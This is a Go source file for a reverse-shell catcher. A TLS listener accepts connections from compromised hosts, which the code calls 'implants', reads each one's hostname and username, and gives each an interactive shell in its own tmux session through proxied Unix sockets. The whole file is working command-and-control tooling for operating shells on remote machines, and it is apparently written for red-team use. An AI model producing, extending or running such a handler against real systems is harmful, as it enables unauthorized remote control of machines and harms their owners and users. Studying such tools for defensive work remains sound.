package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"os"
	"path"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/disneystreaming/gomux"
	"github.com/jessevdk/go-flags"
	log "github.com/sirupsen/logrus"
	"github.com/wader/readline"
)

var opts struct {
	Iface  string `short:"i" long:"host" description:"Interface address on which to bind" default:"127.0.0.1" required:"true"`
	Port   string `short:"p" long:"port" description:"Port on which to bind" default:"8443" required:"true"`
	Keys   string `short:"k" long:"keys" description:"Path to folder with server.{pem,key}" default:"./certs" required:"true"`
	Socket string `short:"s" long:"socket" description:"Domain socket from which the program reads"`
}

func init() {
	_, err := flags.Parse(&opts)
	// the flags package returns an error when calling --help for
	// some reason so we look for that and exit gracefully
	if err != nil {
		if err.(*flags.Error).Type == flags.ErrHelp {
			os.Exit(0)
		}
		log.Fatal(err)
	}

	// Since this binary only builds tmux commands and echoes them,
	// it needs to be piped to bash in order to work.
	// Because of this, all logging is sent to stderr
	log.SetOutput(os.Stderr)
	log.SetLevel(log.DebugLevel)

	// ensure socket folder exists
	if _, err := os.Stat(".state"); os.IsNotExist(err) {
		os.Mkdir(".state", 0700)
	}

	// account for existing session to avoid 'duplicate session' error
	// initSessions()
}

func main() {
	var listener net.Listener
	var err error

	if opts.Socket == "" {
		// Shell-catching mode. TLS -> TMUX -> Shell
		// Once the shell is caught over TLS, it's unwrapped and sent
		// to a local socket, where it will later be read by a new instance
		// of the server configured to read that socket from within a tmux pane

		listener, err = newTLSListener()
		if err != nil {
			log.Fatal(err)
		}
		log.WithFields(log.Fields{"port": opts.Port, "host": opts.Iface}).Info("Listener started")

		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Error(err)
				continue
			}

			sockF, err := prepareTmux(conn)
			if err != nil {
				log.Error(err)
				continue
			}
			time.Sleep(1 * time.Second) // Give socket time to establish
			go proxyConnToSocket(conn, sockF)
		}

	} else {

		// Post-tmux routing.
		// Creates a socket file and listens for input.
		// If in this branch, binary was started from within tmux.
		// Once the tcp and sockets are mutually proxied with
		// `proxyConnToSocket`, the shell will start
		listener, err = net.Listen("unix", opts.Socket)
		if err != nil {
			log.Fatal(err)
		}
		defer listener.Close()
		log.WithField("socket", opts.Socket).Info("Listener started")

		conn, err := listener.Accept()
		if err != nil {
			log.Error(err)
		}
		startShell(conn)
	}

}

func newTLSListener() (net.Listener, error) {
	pem := path.Join(opts.Keys, "server.pem")
	key := path.Join(opts.Keys, "server.key")
	cer, err := tls.LoadX509KeyPair(pem, key)
	if err != nil {
		log.Fatal(err)
	}

	config := &tls.Config{Certificates: []tls.Certificate{cer}}
	connStr := fmt.Sprintf("%s:%s", opts.Iface, opts.Port)
	return tls.Listen("tcp", connStr, config)
}

func startShell(conn net.Conn) {
	log.WithFields(log.Fields{"port": opts.Port, "host": opts.Iface}).Info("Incoming")

	conf := &readline.Config{
		ForceUseInteractive: true,
	}

	tty, err := readline.NewEx(conf)
	if err != nil {
		log.Fatal(err)
	}
	defer tty.Close()

	// BUG: enabling raw allows for tab completion and
	// capturing ctrl-*, but you lose the `shell`
	// command
	// tty.Terminal.EnterRawMode()

	// continuously read the incoming data and print to stdout
	go func() { io.Copy(tty.Stdout(), conn) }()

	// read stdin from user and send to remote implant
	io.Copy(conn, tty.Operation.GetConfig().Stdin)
}

func implantInfo(conn net.Conn) (hostname, username string, err error) {
	reader := bufio.NewReader(conn)
	hostname, err = reader.ReadString('\n')
	if err != nil {
		err = fmt.Errorf("hostname read failed: %w", err)
		return
	}

	username, err = reader.ReadString('\n')
	if err != nil {
		err = fmt.Errorf("username read failed: %w", err)
		return
	}

	// tmux session names can't contain "."
	hostname = strings.ReplaceAll(strings.TrimSuffix(hostname, "\n"), ".", "_")
	username = strings.TrimSuffix(username, "\n")
	return
}

func genTempFilename(username string) (string, error) {
	file, err := ioutil.TempFile(".state", fmt.Sprintf("%s.*.sock", username))
	if err != nil {
		err = fmt.Errorf("temp file failed: %w", err)
		return "", err
	}
	os.Remove(file.Name())

	path, err := filepath.Abs(file.Name())
	if err != nil {
		err = fmt.Errorf("temp path read failed: %w", err)
		return "", err
	}
	return path, nil
}

func prepareTmux(conn net.Conn) (string, error) {

	hostname, username, err := implantInfo(conn)
	if err != nil {
		return "", fmt.Errorf("failed getting implant info: %w", err)
	}

	var session *gomux.Session
	exists, err := gomux.CheckSessionExists(hostname)
	if err != nil {
		return "", err
	}

	if exists {
		log.WithField("host", hostname).Debug("reusing existing session")
		session = &gomux.Session{Name: hostname}
	} else {
		log.WithField("host", hostname).Info("new host connected, creating session")
		session, err = gomux.NewSession(hostname)
		if err != nil {
			log.Warn(err)
		}
	}

	window, err := session.AddWindow(username)
	if err != nil {
		log.Warn(err)
	}

	path, err := genTempFilename(username)
	if err != nil {
		return "", err
	}

	window.Panes[0].Exec(`echo -e '\a'`) // ring a bell
	self := os.Args[0]
	cmd := fmt.Sprintf("%s -s %s", self, path)
	window.Panes[0].Exec(cmd)
	log.WithFields(log.Fields{"session": session.Name, "window": username}).Info("new shell in tmux")
	return path, nil
}

func proxyConnToSocket(conn net.Conn, sockF string) {
	socket, err := net.Dial("unix", sockF)
	if err != nil {
		log.WithField("err", err).Error("failed to dial sockF")
		return
	}
	defer socket.Close()
	defer os.Remove(sockF)

	wg := sync.WaitGroup{}

	// forward socket to tcp
	wg.Add(1)
	go (func(socket net.Conn, conn net.Conn) {
		defer conn.Close()
		defer wg.Done()
		io.Copy(conn, socket)
	})(socket, conn)

	// forward tcp to socket
	wg.Add(1)
	go (func(socket net.Conn, conn net.Conn) {
		defer socket.Close()
		defer wg.Done()
		io.Copy(socket, conn)
	})(socket, conn)

	// keep from returning until sockets close so we
	// can cleanup the socket file using `defer`
	wg.Wait()
}
